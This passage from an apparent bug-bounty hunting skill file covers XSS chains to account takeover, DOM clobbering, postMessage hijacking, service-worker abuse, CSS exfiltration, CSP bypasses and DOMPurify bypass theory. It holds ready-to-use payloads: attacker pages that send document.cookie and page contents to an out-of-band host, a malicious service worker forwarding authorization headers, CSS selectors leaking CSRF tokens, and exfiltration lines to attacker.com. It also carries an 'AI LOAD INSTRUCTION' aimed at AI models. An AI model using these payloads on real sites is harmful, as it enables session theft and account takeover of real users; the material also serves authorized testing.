- **C.** Craft attacker-hosted page that submits the CSRF form setting `bio` to the XSS payload. Victim visits attacker page → CSRF fires → victim's profile updated → victim's next visit to their own profile executes attacker JS.
- **Impact:** Self-XSS that "doesn't pay" becomes ATO. The payload runs in the victim's authenticated session — extract cookie, force email change via XHR, password reset → full ATO.
- **Real shape:** Multiple H1 disclosures 2019-2023 across social platforms. Cross-refs `hunt-csrf` step 7 (form-based CSRF on profile mutation).

### Chain 3 — DOM XSS on /signin or /oauth Callback → Fragment Token Capture → ATO

- **A.** Find DOM XSS on a `/signin`, `/oauth/callback`, or `/auth/return` page — typically `document.location.hash` parsed into the DOM without escaping.
- **B.** OAuth-implicit-flow callbacks frequently land tokens in the URL fragment (`#access_token=...`). The fragment is NOT sent to the server; only the browser sees it.
- **C.** XSS payload reads `document.location.hash`, base64-encodes it, exfils via `Image()` to attacker domain. Attacker now holds the OAuth access token.
- **Impact:** Cross-platform ATO. The access token typically grants API scope to Facebook/Google/Microsoft user data; some implementations use the token directly as the session.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor OAuth token leakage (F. Rosén, 2022); Zoom OAuth chained ATO $15,000 (H1 / Harel Security, 2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19 and #20.

### Chain 4 — SVG Upload XSS + CSP Bypass → JS Execution on Trusted Origin → Cookie/Token Theft

- **A.** Identify a file-upload feature that accepts `image/svg+xml`. SVG files are XML and can contain `<script>` tags — many sanitisers process PNG/JPG but pass SVG through unmodified.
- **B.** CSP frequently applies to HTML responses but NOT to `image/svg+xml` responses. The SVG executes JS in the context of whichever origin serves it.
- **C.** If the SVG is served same-origin (common when uploads go to `target.com/uploads/<sha>.svg`), the executing JS has full session-cookie access and can call any same-origin API.
- **Impact:** Stored XSS on the trusted origin without going through any reflected/stored content vector — bypasses CSP entirely; pulls session cookies, calls password-change endpoints, ATO.
- **Real shape:** Multiple disclosed cases across SaaS uploaders; cross-refs `hunt-file-upload` SVG section and `hunt-xxe` Disclosed Report Citation #3 and #4 (Zivver/Lab45 SVG-upload chains).

### Chain 5 — postMessage XSS + Origin Check Bypass → Cross-Origin Token Exfil → ATO

- **A.** Identify a `window.addEventListener('message', handler)` where `handler` does NOT check `event.origin` (or checks it with a `indexOf`/`endsWith` that fails on `target.com.attacker.com`).
- **B.** Attacker page opens `target.com` in a popup or iframe. Once loaded, sends a `postMessage` payload that the handler evals, processes as XSS, or uses to extract `document.cookie`.
- **C.** Handler executes in `target.com` context; response is `postMessage`'d back to attacker page via `event.source.postMessage(stolenData, '*')`.
- **Impact:** Cross-origin JS execution and exfil with no CSP violation — `postMessage` is a legitimate cross-origin channel; CSP doesn't gate it. Token theft / session hijack.
- **Real shape:** Detectify "Dirty Dancing" multi-vendor postMessage gadgets (2022); Zoom OAuth + postMessage chain (2024). Cross-refs `hunt-oauth` Disclosed Report Citation #19, #20.

### Chain 6 — Markdown/Wiki XSS + Privileged Viewer → Cross-Privilege Stored XSS

- **A.** Stored XSS in a collaborative content field (wiki page, issue comment, customer ticket, support reply) — payload survives Markdown rendering due to insufficient allowlist on `<style>`, `<math>`, `<svg>`, or attribute filters.
- **B.** The collaborative content is viewed by a privileged user (admin, support agent with elevated permissions, project maintainer).
- **C.** Privileged viewer's session executes the payload in their authenticated context — XHR to admin-only endpoints, role-change of attacker, secret exfil from admin-only panels.
- **Impact:** Privilege escalation from low-priv user to admin via stored XSS — attacker promotes themselves on the privileged user's behalf.
- **Real shape:** GitLab/Jira/Confluence markdown-XSS-to-admin-priv-esc class; common payout pattern is High (privilege escalation severity bump over standalone stored XSS).

### Operator-level pattern

When you confirm XSS at A, immediately ask: what state-changing endpoint or token store does this JS now have access to? *Where does the payload run, and who sees it?* The chain payout is 5-20x the standalone XSS payout. Discipline gate before submission: do not file XSS as "Critical" without demonstrating the terminal impact (ATO / token exfil / privilege escalation); file as Medium otherwise.

Cross-references:
- `hunt-cache-poison` — Chain 1
- `hunt-csrf` — Chain 2
- `hunt-oauth` — Chains 3, 5
- `hunt-file-upload` / `hunt-xxe` — Chain 4
- `hunt-ato` — terminal impact for Chains 2, 3, 4, 5

---

## Related Skills & Chains

- **`hunt-cache-poison`** — Reflected XSS becomes stored-equivalent at CDN scale when the vulnerable parameter is unkeyed. Chain primitive: `X-Forwarded-Host: attacker.com` poisons a cached response whose `<script src=...>` now points at attacker.com → every CDN-edge visitor executes attacker JS without any per-victim interaction.
- **`hunt-csrf`** — XSS on origin auto-defeats SameSite=Lax and same-origin checks for state-changing endpoints. Chain primitive: stored XSS in profile bio → fetch(`/settings/email`, {method:'POST', body:'email=attacker@evil'}) executes with victim's cookies and origin → silent email takeover → password reset → full ATO without the victim ever leaving the page.
- **`hunt-http-smuggling`** — Smuggling delivers an XSS payload into the response queue of the NEXT victim's request, even on endpoints that sanitize their own inputs. Chain primitive: smuggle a request whose response (carrying attacker HTML) is served as the body of the next legitimate user's GET / → reflected XSS at every visitor without any URL parameter visible in their address bar.
- **`security-arsenal`** — Reach for the XSS payload bank (SVG+style, math+style mXSS, CSP-bypass JSONP gadgets, HTML5 event handlers WAFs miss) before hand-crafting payloads; also the always-rejected list to confirm self-XSS / alert-only PoCs are not submittable.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on stored XSS that only fires in the attacker's own session, or before claiming reflected XSS where the canary appears HTML-encoded (`&lt;`) in the response body — those are the two most common downgrade-to-N/A traps.


---

## hunt-dom — Hunting Methodology (real BB reports)

# HUNT-DOM — DOM Clobbering / PostMessage / Service Worker / CSS Exfil

## Crown Jewel Targets

DOM-based attacks execute in the victim's browser — the server often never sees the payload, so WAFs and server-side input filters do not apply. PostMessage missing-origin-check = cross-origin token theft with no XSS needed.

**Highest-value chains:**
- **DOM Clobbering → DOM-XSS / auth bypass** — HTML *markup* injection (no `<script>`) overwrites a JS global like `window.config` or shadows `document.getElementById`, and the app later treats that value as a URL/code → sink fires under a markup-only injection where script is filtered.
- **PostMessage no origin check → session theft / DOM-XSS** — a `message` handler that trusts `event.data` without validating `event.origin` lets an attacker iframe/opener drive privileged actions or feed a sink.
- **Service Worker abuse** — register a **same-origin** SW script (reachable because of an upload / open-redirect / path the target serves) via stored XSS → intercept all in-scope `fetch` → persistent credential capture.
- **CSS Exfil** — attribute-value selectors (`input[value^="a"]`) leak a CSRF token / API key / nonce char-by-char to an OOB host with zero JS.

### Grounding — public research this is distilled from
- **DOM Clobbering / DOM-Invader** — Gareth Heyes & the PortSwigger Web Security Academy "DOM clobbering" topic; DOM-Invader ships a dedicated clobbering scanner. Sink taxonomy maps to the academy's DOM-based vulnerability labs.
- **DOMPurify clobbering & mXSS bypasses** — Michał Bentkowski (Securitum) blog series on bypassing HTML sanitizers via clobbering and mutation XSS.
- **jQuery `htmlPrefilter` self-closing-tag XSS** — **CVE-2020-11022** and **CVE-2020-11023** (jQuery < 3.5.0). Passing attacker HTML to `.html()` / `.append()` mutates into executing markup. Grep bundled jQuery version; this is one of the most common real-world DOM-XSS roots.
- **CSS exfiltration** — d0nut "CSS Injection Attacks" / "Stealing Data With CSS" research (sequential `@import` recursion to drop the per-char-position constraint).
> Cite only what you reproduce. Do not paste these as "proof" in a report — your PoC against the live target is the evidence. Named research here is for *technique provenance*, not severity inflation.

---

## Attack Surface Signals

```
# Injection points that allow MARKUP but may strip <script>:
user bio / display name / comment / markdown preview / SVG upload / CMS rich-text

# postMessage endpoints (iframes, SSO widgets, payment frames, chat widgets):
*/sso/*  */embed/*  */widget/*  */oauth/*  /sdk.js  pay/checkout iframes

# Service worker presence:
/sw.js  /service-worker.js  /firebase-messaging-sw.js  /ngsw-worker.js (Angular)

# CSS injection points:
?theme=  custom-css profile field  email-template editor  style= passthrough
```

---

## Phase 1 — DOM Clobbering

```bash
# Signal: app reads element IDs/names as if they were JS objects, OR feeds a
# clobberable global into a sink (location, innerHTML, eval, script.src).
# Inject MARKUP (no script) at a sink that lets named/id'd elements through.

# Single-level clobber of window.config:
#   <a id="config" href="https://evil.com">
# Clobber a NON-built-in global the app reads (built-in methods like getElementById can't be shadowed this way):
#   <a id="config"></a><a id="config" name="url">   # window.config.url resolves to an attacker-controlled element/string
# Clobber a string-coerced URL value (anchor toString() == href):
#   <a id="x"></a><a id="x" name="y" href="https://evil.com">   # x.y -> href
# Nested window.a.b.c via form/inputs:
#   <form id="a"><input id="b" name="c" value="clobbered"></form>
# baseURI / relative-URL hijack:
#   <base href="https://evil.com/">      # bends every relative src/href
```

```javascript
// Browser console: find globals that are clobberable AND reach a sink.
// A var only matters if the app later concatenates it into a URL/HTML/eval.
const susp = ['config','settings','options','appConfig','init','data','user',
  'token','csrf','nonce','baseUrl','apiUrl','cdn','redirect','next','debug'];
susp.forEach(k => {
  const v = window[k];
  // HTMLCollection / element => already clobbered or clobberable namespace
  if (v && (v instanceof Element || v instanceof HTMLCollection))
    console.log('[CLOBBERED/NAMESPACE]', k, v);
  else if (v !== undefined) console.log('[GLOBAL]', k, '=', v);
});
```

```bash
# Source review: find globals fed into sinks (this is what makes clobbering exploitable)
curl -s "https://$TARGET/" | grep -nE \
  "document\.(getElementById|baseURI)|window\.[A-Za-z_]+\.(url|src|href|html|cmd)|\
location\s*=\s*[A-Za-z_]|\.innerHTML\s*=|eval\(|new Function\(|\.src\s*=\s*[A-Za-z_]"
# DOM-Invader (Burp) → enable "DOM clobbering" — it auto-finds clobberable sources→sinks.
```

**jQuery angle:** if the bundle ships jQuery < 3.5.0, attacker HTML passed to `.html()`/`.append()` self-mutates to execute (**CVE-2020-11022 / CVE-2020-11023**). Confirm version then test `<style><style /><img src=x onerror=alert(document.domain)>`.

---

## Phase 2 — PostMessage Hijacking

Two bug classes: (a) **listener** trusts cross-origin data → drive a sink/privileged action; (b) **sender** broadcasts secrets with target origin `'*'` → any framing page reads them.

```bash
# Find handlers and flag the ones with NO origin check
grep -rnE "addEventListener\(\s*['\"]message['\"]|onmessage\s*=" recon/$TARGET/ --include="*.js" 2>/dev/null \
  | grep -vE "\.origin\b" 
# Then for each, read +/- 20 lines: where does event.data go? (innerHTML/eval/location/token store)
# Senders that leak: grep for postMessage(<secret>, '*')
grep -rnE "postMessage\([^,]+,\s*['\"]\*['\"]\)" recon/$TARGET/ --include="*.js" 2>/dev/null
```

```html
<!-- PoC A: drive a no-origin-check LISTENER from an attacker page -->
<!-- Host on attacker.com; frames target and pushes a privileged message -->
<iframe id="f" src="https://TARGET/page-with-listener"></iframe>
<script>
  document.getElementById('f').onload = () => {
    const w = document.getElementById('f').contentWindow;
    // Shape the payload to whatever the handler routes into a sink:
    w.postMessage({type:'navigate', url:'javascript:fetch("https://OOB/x?c="+document.cookie)'}, '*');
    w.postMessage('<img src=x onerror=fetch("https://OOB/dom?h="+btoa(document.body.innerHTML))>', '*');
  };
</script>
```

```html
<!-- PoC B: capture secrets from a SENDER that uses targetOrigin '*' -->
<iframe id="f" src="https://TARGET/sso-or-widget" style="display:none"></iframe>
<pre id="out"></pre>
<script>
addEventListener('message', e => {
  // Only count it if e.origin is the TARGET and data carries a secret
  out.textContent += `origin=${e.origin}\ndata=${JSON.stringify(e.data)}\n---\n`;
  if (/token|session|jwt|code=/i.test(JSON.stringify(e.data)))
    fetch('https://OOB/pm?d='+encodeURIComponent(JSON.stringify(e.data))); // OOB proof
});
</script>
```

> False-positive guard: a handler with a *partial* check (`origin.indexOf('target.com')>-1`, `endsWith('target.com')`, regex `target\.com`) is still vulnerable — bypass with `target.com.evil.com` or `eviltarget.com`. Confirm by serving the PoC from such a look-alike host and showing the message still lands.

---

### PostMessage handler race — win the message before origin is set
Beyond static origin/sender checks: some handlers trust the FIRST message, or read `event.origin` while it is still `""`/`null` during frame load. Race it — flood `postMessage` in a tight loop during iframe/popup load, or fire from `about:blank` before navigation, so your message lands before the legit sender or before strict origin setup runs. Test any handler that assumes "first message = trusted". Disclosed: reports/381356.

## Phase 3 — Service Worker Abuse

**Hard rule (corrects a common mistake):** a SW script URL **must be same-origin** as the page calling `register()`. A cross-origin script URL (`https://evil.com/sw.js`) throws `SecurityError` — there is **no header that enables cross-origin SW *script* registration**. `Service-Worker-Allowed` only widens the **scope** a same-origin script may control, not where the script may live.

So the realistic path is: get a SW script **onto the target origin** (file upload that serves JS, open-redirect/path the origin reflects as a script, a JSON/JSONP endpoint with `text/javascript`, or an existing route under your control), then register it from same-origin XSS.

```bash
# Enumerate existing SW + its scope
curl -s "https://$TARGET/" | grep -iE "serviceWorker\.register|navigator\.serviceWorker"
for p in sw.js service-worker.js firebase-messaging-sw.js ngsw-worker.js; do
  curl -s -o /dev/null -w "%{http_code} $p\n" "https://$TARGET/$p"; done
curl -s "https://$TARGET/sw.js" | grep -iE "scope|addEventListener\('fetch'|caches"
# Look for an upload/route that returns Content-Type: text/javascript on YOUR content:
#   curl -s -D- https://$TARGET/uploads/<id> | grep -i content-type
```

```javascript
// Runs in same-origin XSS. SCRIPT MUST BE SAME-ORIGIN (e.g. /uploads/evil-sw.js
// served by the target). scope must be <= the directory the script is served from
// unless the response carries Service-Worker-Allowed.
navigator.serviceWorker.register('/uploads/evil-sw.js', {scope: '/'})
  .then(r => fetch('https://OOB/sw-registered?scope='+r.scope))  // OOB proof of registration
  .catch(e => console.log('SW reg failed', e.name));  // SecurityError => wrong origin/scope

// evil-sw.js (served from the TARGET origin):
self.addEventListener('fetch', e => {
  e.respondWith(fetch(e.request.clone()).then(async resp => {
    // Exfil URL + any auth header the page attaches, to OOB
    fetch('https://OOB/sw-intercept', {method:'POST',
      body: JSON.stringify({url: e.request.url,
        auth: e.request.headers.get('authorization')})});
    return resp;
  }));
});
```

> Persistence note: a SW survives tab close and re-runs on next visit within scope — that is what makes it Critical. Confirm persistence by closing all tabs, reopening the origin, and showing a fresh OOB hit with no XSS re-trigger.

---

## Phase 4 — CSS Injection / Exfiltration

```bash
# Prereq: attacker controls CSS (custom-theme field, style= passthrough, email
# template, markdown CSS). Targets: hidden CSRF input, API key in meta, nonce attr.
# Step 1 confirm injection: inject "color:red" on a known element, observe render.
# Step 2 leak attribute values char-by-char via attribute selectors + url() to OOB.
```

> **Scope caveat (corrects an overstatement):** CSS exfil bypasses CSP that blocks *script execution* — it does **not** bypass a CSP whose `style-src` / `img-src` / `default-src` / `connect-src` restricts external origins, or `form-action`. If `img-src 'self'` is set, `url(https://OOB/...)` is **blocked**. Always read the live `Content-Security-Policy` header first; if external resource origins are locked down, CSS exfil is dead and you should say so rather than claim it.

```css
/* One request fires only for the matching first char. */
input[name="csrf"][value^="a"] { background: url(https://OOB.example/c?p=0&c=a); }
input[name="csrf"][value^="b"] { background: url(https://OOB.example/c?p=0&c=b); }
/* ...all chars... then chain @import to leak position 1 conditioned on position 0, etc. */
meta[name="csrf-token"][content^="a"] { background: url(https://OOB.example/c?m=a); }
```

```python
# Generate a single-position CSS exfil set (loop positions with sequential @import in practice)
import string
chars = string.ascii_letters + string.digits + '-_'
attr, oob, pos = 'name="csrf"', 'https://OOB.example/c', 0
print("\n".join(
  f'input[{attr}][value^="{c}"]{{background:url({oob}?p={pos}&c={c})}}' for c in chars))
# Real exfil needs recursion: serve a stylesheet whose @import pulls the next
# position's rules only after the current prefix matched (d0nut technique) —
# this removes the "static input, one char" limitation.
```

> Validation: the proof is **OOB hits**, not a rendered color. Stand up a Collaborator / request-bin and show one hit per correct character forming the real token, then demonstrate using that token in a state-changing CSRF request. No OOB callback = no finding (a 0-byte image or CSP-blocked request looks identical to success in DevTools).

---

## Phase 5 — dangerouslySetInnerHTML / framework sinks

```bash
grep -rnE "dangerouslySetInnerHTML|v-html=|\[innerHTML\]=|\.html\(" recon/$TARGET/ --include="*.js" 2>/dev/null
# In minified Next/React bundles:
curl -s "https://$TARGET/_next/static/chunks/pages/index.js" | grep -oP 'dangerouslySetInnerHTML.{0,120}'
# Trace whether user data reaches it WITHOUT a sanitizer (DOMPurify/sanitize-html).
# If DOMPurify IS present, check for clobbering/mXSS bypass (Bentkowski research) and version.
```

---

## Phase 6 — Client-Side Template Injection

```bash
# Detect framework, then test the {{}} sink in a sandbox-bypass form.
grep -rnE "angular|vue|handlebars|mustache|nunjucks|alpinejs|\bv-|ng-app" recon/$TARGET/ --include="*.js" 2>/dev/null | head
# Probe (server may render, so confirm it's CLIENT-side by viewing rendered DOM, not curl):
#   {{7*7}}  -> 49 in the live DOM (not in raw HTML) => CSTI
# AngularJS sandbox-escape style payloads (version-dependent; older 1.x):
#   {{constructor.constructor('alert(document.domain)')()}}
# Vue: {{_c.constructor('alert(1)')()}}    (varies by Vue 2/3 build)
```

---

## Chain Table

| DOM finding | Chain to | Impact |
|-------------|----------|--------|
| DOM Clobbering → clobbered URL into `script.src`/`location` | DOM-XSS under markup-only injection | High / auth bypass |
| PostMessage no/weak origin check (listener) | data → innerHTML/eval/location sink | DOM-XSS → ATO |
| PostMessage `targetOrigin:'*'` sender | any framing page reads token/auth code | Cross-origin token theft |
| CSS exfil (OOB-confirmed) | leak CSRF token → fire CSRF | CSRF chain (Medium+) |
| Same-origin Service Worker via XSS | intercept all in-scope fetch + auth headers | Persistent ATO (Critical) |
| dangerouslySetInnerHTML, no sanitizer | stored DOM-XSS | XSS → ATO |

---

## Tools

```bash
# DOM Invader (built into Burp browser) — sources→sinks, postMessage logger, clobbering scanner
# postMessage-tracker — Chrome extension logging cross-window messages
# Burp Collaborator / interactsh / request-bin — MANDATORY OOB sink for CSS-exfil & SW PoCs
# Verify any tool URL before citing it in a report; do not paste unverified repo links.
```

---

## Validation (false-positive discipline)

Match the repo standard: a technique that *fires in DevTools* is not a finding until impact is **OOB-confirmed** and **state-proven**.

- **DOM Clobbering** — show the clobbered value actually reaching a sink (XSS payload executes, or app navigates/loads from attacker URL). A clobberable global that never reaches a sink = no impact, do not report.
- **PostMessage** — distinguish a *missing* check from a *weak* one; bypass weak checks from a look-alike origin and capture via OOB. A noisy `message` log alone is not proof — show the privileged action or token exfil.
- **CSS exfil** — **OOB callback per correct character is the only proof.** Read CSP first: `img-src`/`style-src`/`connect-src`/`default-src` restricting external origins kills it. A blocked `url()` is indistinguishable from success in the Network tab — confirm on the Collaborator side.
- **Service Worker** — registration must be **same-origin script**; a `SecurityError` means you cited the wrong origin. Prove *persistence* (close tabs → reopen → fresh OOB hit, no XSS re-fire).
- **General** — unique per-test markers (`btoa(domain)+nonce`) so an OOB hit is attributable to YOUR payload and not background traffic; body-diff the rendered DOM, not the raw HTML, since these are client-side.

**Severity:**
- Same-origin Service Worker → persistent credential intercept: **Critical**
- PostMessage data → DOM-XSS / token theft → ATO: **High–Critical**
- DOM Clobbering → DOM-XSS reaching auth/session: **High**
- CSS exfil of CSRF token (OOB-proven) → CSRF: **Medium** (raise if the chained CSRF is account-critical)



---

## csp-bypass-advanced

# SKILL: CSP Bypass — Advanced Techniques

> **AI LOAD INSTRUCTION**: Covers per-directive bypass techniques, nonce/hash abuse, trusted CDN exploitation, data exfiltration despite CSP, and framework-specific bypasses. Base models often suggest `unsafe-inline` bypass without checking if the CSP actually uses it, or miss the critical `base-uri` and `object-src` gaps.

## 0. RELATED ROUTING

- xss-cross-site-scripting — for XSS vectors to deliver after CSP bypass
- csrf-cross-site-request-forgery — when CSP lacks form-action

---

## 1. CSP DIRECTIVE REFERENCE MATRIX

| Directive | Controls | Default Fallback |
|---|---|---|
| `default-src` | Fallback for all `-src` directives not explicitly set | None (browser default: allow all) |
| `script-src` | JavaScript execution | `default-src` |
| `style-src` | CSS loading | `default-src` |
| `img-src` | Image loading | `default-src` |
| `connect-src` | XHR, fetch, WebSocket, EventSource | `default-src` |
| `frame-src` | iframe/frame sources | `default-src` |
| `font-src` | Font loading | `default-src` |
| `object-src` | `<object>`, `<embed>`, `<applet>` | `default-src` |
| `media-src` | `<audio>`, `<video>` | `default-src` |
| `base-uri` | `<base>` element | **No fallback** — unrestricted if absent |
| `form-action` | Form submission targets | **No fallback** — unrestricted if absent |
| `frame-ancestors` | Who can embed this page (replaces X-Frame-Options) | **No fallback** — unrestricted if absent |
| `report-uri` / `report-to` | Where violation reports are sent | N/A |
| `navigate-to` | Navigation targets (limited browser support) | **No fallback** |

**Critical insight**: `base-uri`, `form-action`, and `frame-ancestors` do NOT fall back to `default-src`. Their absence is always a potential bypass vector.

---

## 2. BYPASS TECHNIQUES BY DIRECTIVE

### 2.1 `script-src 'self'`

The app only allows scripts from its own origin. Bypass vectors:

| Vector | Technique |
|---|---|
| JSONP endpoints | `<script src="/api/jsonp?callback=alert(1)//"></script>` — JSONP reflects callback as JS |
| Uploaded JS files | Upload `.js` file (e.g., avatar upload accepts any extension) → `<script src="/uploads/evil.js"></script>` |
| DOM XSS sinks | Find DOM sinks (innerHTML, eval, document.write) in existing same-origin JS — inject via URL fragment/param |
| Angular/Vue template injection | If framework is loaded from `'self'`, inject template expressions: `{{constructor.constructor('alert(1)')()}}` |
| Service Worker | Register SW from same origin → intercept and modify responses |
| Path confusion | `<script src="/user-content/;/legit.js">` — server returns user content due to path parsing, but URL matches `'self'` |

### 2.2 `script-src` with CDN Whitelist

```
script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net
```

| Whitelisted CDN | Bypass |
|---|---|
| `cdnjs.cloudflare.com` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection |
| `cdn.jsdelivr.net` | jsdelivr serves any npm package or GitHub file: `cdn.jsdelivr.net/npm/attacker-package@1.0.0/evil.js` |
| `*.googleapis.com` | Google JSONP endpoints, Google Maps callback parameter |
| `unpkg.com` | Same as jsdelivr — serves arbitrary npm packages |
| `*.cloudfront.net` | CloudFront distributions are shared — any CF customer's JS is allowed |

**Trick**: Search for JSONP endpoints on whitelisted domains: `site:googleapis.com inurl:callback`

### 2.3 `script-src 'unsafe-eval'`

`eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)` all permitted.

```javascript
// Template injection → RCE-equivalent in browser
[].constructor.constructor('alert(document.cookie)')()

// JSON.parse doesn't execute code, but if result is used in eval context:
// App does: eval('var x = ' + JSON.parse(userInput))
```

### 2.4 `script-src 'nonce-xxx'`

Only scripts with matching nonce attribute execute.

| Bypass | Condition |
|---|---|
| Nonce reuse | Server uses same nonce across requests or for all users → predictable |
| Nonce injection via CRLF | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">` |
| Dangling markup to steal nonce | `<img src="https://attacker.com/steal?` (unclosed) → page content including nonce leaks as URL parameter |
| DOM clobbering | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
| Script gadgets | Trusted nonced script uses DOM data to create new script elements — inject that DOM data |

### 2.5 `script-src 'strict-dynamic'`

Trust propagation: any script created by an already-trusted script is also trusted, regardless of source.

| Bypass | Technique |
|---|---|
| `base-uri` injection | `<base href="https://attacker.com/">` → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to `https://attacker.com/lib.js` |
| Script gadget in trusted code | Find trusted script that does `document.createElement('script'); s.src = location.hash.slice(1)` → control via URL fragment |
| DOM XSS in trusted script | Trusted script reads `innerHTML` from user-controlled source → injected `<script>` is trusted via `strict-dynamic` |

### 2.6 Angular / Vue CSP Bypass

**Angular (with CSP):**
```html
<!-- Angular template expression bypasses script-src when angular.js is whitelisted -->
<div ng-app ng-csp>
  {{$eval.constructor('alert(1)')()}}
</div>

<!-- Angular >= 1.6 sandbox removed, so simpler: -->
{{constructor.constructor('alert(1)')()}}
```

**Vue.js:**
```html
<!-- Vue 2 with runtime compiler -->
<div id=app>{{_c.constructor('alert(1)')()}}</div>
<script src="https://whitelisted-cdn/vue.js"></script>
<script>new Vue({el:'#app'})</script>
```

### 2.7 Missing `object-src`

If `object-src` is not set (falls back to `default-src`), and `default-src` allows some origins:

```html
<!-- Flash-based bypass (legacy, mostly patched, but still appears on old systems) -->
<object data="https://attacker.com/evil.swf" type="application/x-shockwave-flash">
  <param name="AllowScriptAccess" value="always">
</object>

<!-- PDF plugin abuse -->
<embed src="/user-upload/evil.pdf" type="application/pdf">
```

### 2.8 Missing `base-uri`

```html
<!-- Inject base tag → all relative URLs resolve to attacker -->
<base href="https://attacker.com/">

<!-- Existing script: <script src="/js/app.js"> -->
<!-- Now loads: https://attacker.com/js/app.js -->
```

This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths.

### 2.9 Missing `frame-ancestors`

CSP without `frame-ancestors` → page can be framed → clickjacking possible.

`X-Frame-Options` header is overridden by `frame-ancestors` if CSP is present. But if CSP exists without `frame-ancestors`, some browsers ignore XFO entirely.

---

## 3. CSP IN META TAG vs. HEADER

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">
```

**Meta tag limitations:**
- Cannot set `frame-ancestors` (ignored in meta)
- Cannot set `report-uri` / `report-to`
- Cannot set `sandbox`
- If injected via HTML injection *before* the meta tag in DOM order, attacker's meta CSP may be processed first (browser uses first encountered)
- If page has both header CSP and meta CSP, **both apply** (most restrictive wins)

---

## 4. DATA EXFILTRATION DESPITE CSP

When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration channels:

| Channel | CSP Directive Needed to Block | Technique |
|---|---|---|
| DNS prefetch | None (CSP cannot block DNS) | `<link rel="dns-prefetch" href="//data.attacker.com">` |
| WebRTC | None (CSP cannot block) | `new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com'}]})` |
| `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP |
| Redirect-based | `navigate-to` (rarely set) | `location='https://attacker.com/?'+document.cookie` |
| CSS injection | `style-src` | `<style>body{background:url(https://attacker.com/?data)}</style>` |
| `<a ping>` | `connect-src` | `<a ping="https://attacker.com/collect" href="#">click</a>` |
| `report-uri` leak | N/A | Trigger CSP violation → report contains blocked-uri with data |
| Form submission | `form-action` | `<form action="https://attacker.com/"><button>Submit</button></form>` |

**DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.

---

## 5. CSP BYPASS DECISION TREE

```
CSP present?
├── Read full policy (response headers + meta tags)
│
├── Check for obvious weaknesses
│   ├── 'unsafe-inline' in script-src? → Standard XSS works
│   ├── 'unsafe-eval' in script-src? → eval/Function/setTimeout bypass
│   ├── * or data: in script-src? → <script src="data:,alert(1)">
│   └── No CSP header at all on some pages? → Find CSP-free page
│
├── Check missing directives
│   ├── No base-uri? → <base href="https://attacker.com/"> → hijack relative scripts
│   ├── No object-src? → Flash/plugin-based bypass (legacy)
│   ├── No form-action? → Exfil via form submission
│   ├── No frame-ancestors? → Clickjacking possible
│   └── No connect-src falling back to lax default-src? → fetch/XHR exfil
│
├── script-src 'self'?
│   ├── Find JSONP endpoints on same origin
│   ├── Find file upload → upload .js file
│   ├── Find DOM XSS in existing same-origin scripts
│   └── Find Angular/Vue loaded from self → template injection
│
├── script-src with CDN whitelist?
│   ├── Check CDN for JSONP endpoints
│   ├── Check jsdelivr/unpkg/cdnjs → load attacker-controlled package
│   └── Check *.cloudfront.net → shared distribution namespace
│
├── script-src 'nonce-xxx'?
│   ├── Nonce reused across requests? → Replay
│   ├── CRLF injection available? → Inject nonce
│   ├── Dangling markup to steal nonce
│   └── Script gadget in trusted scripts
│
├── script-src 'strict-dynamic'?
│   ├── base-uri not set? → <base> hijack
│   ├── DOM XSS in trusted script? → Inherit trust
│   └── Script gadget creating dynamic scripts from DOM data
│
└── All script execution blocked?
    ├── Dangling markup injection → exfil without JS
    ├── DNS prefetch exfiltration
    ├── WebRTC exfiltration
    ├── CSS injection for data extraction
    └── Form action exfiltration
```

---

## 6. TRICK NOTES — WHAT AI MODELS MISS

1. **`default-src 'self'` does NOT restrict `base-uri` or `form-action`** — these have no fallback. This is the #1 CSP mistake.
2. **`strict-dynamic` ignores whitelist**: When `strict-dynamic` is present, host-based allowlists and `'self'` are ignored for script loading. Only nonce/hash and trust propagation matter.
3. **Multiple CSPs stack**: If both `Content-Security-Policy` header and `<meta>` CSP exist, the browser enforces BOTH — the effective policy is the intersection (most restrictive).
4. **`Content-Security-Policy-Report-Only`** does not enforce — it only reports. Check for the correct header name.
5. **Nonce length matters**: Nonces should be ≥128 bits of entropy. Short or predictable nonces can be brute-forced or guessed.
6. **Report-uri information disclosure**: CSP violation reports sent to `report-uri` contain `blocked-uri`, `source-file`, `line-number` — this can leak internal URLs, script paths, and page structure to whoever controls the report endpoint.
7. **`data:` in script-src**: `script-src 'self' data:` allows `<script src="data:text/javascript,alert(1)">` — trivial bypass, but commonly seen in real-world CSPs.



---

## dompurify

# DOMPurify XSS Bypass Testing

## Architecture Overview

DOMPurify 3.4.16 sanitizes HTML via a 15-step element pipeline and 15-step attribute pipeline using `DOMParser` (scripting flag disabled) to parse input into a detached document, then walks the resulting DOM with `NodeIterator` to remove dangerous nodes and attributes before serializing back to a string.

**Security-critical assumptions DOMPurify makes:**
1. `serialize(parse(input))` is idempotent -- the browser re-parse of output matches what DOMPurify saw
2. No prototype pollution has modified `Object.prototype` before `sanitize()` is called
3. Configuration object is not attacker-influenced
4. No post-sanitization transforms are applied to the output

**The five XSS failure models:**
- Model A: DOMPurify implementation defect (CVE-class bypass, mXSS)
- Model B: Configuration weakness (permissive allowlists, dangerous options)
- Model C: Post-sanitization transforms (decode, concat, template after sanitize)
- Model D: Wrapper/integration failures (error fallback, type bypass, caching)
- Model E: Framework-specific sinks (dangerouslySetInnerHTML, v-html, etc.)

**IS_ALLOWED_URI regex (default):**
```
/^(?:(?:(?:f|ht)tps?|mailto|tel|callto|sms|cid|xmpp|matrix):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
```

---

## Failure Model A: mXSS / Parser Differential Bypasses

### Core Concept

Mutation XSS exploits: `parse(serialize(parse(input))) != parse(input)`

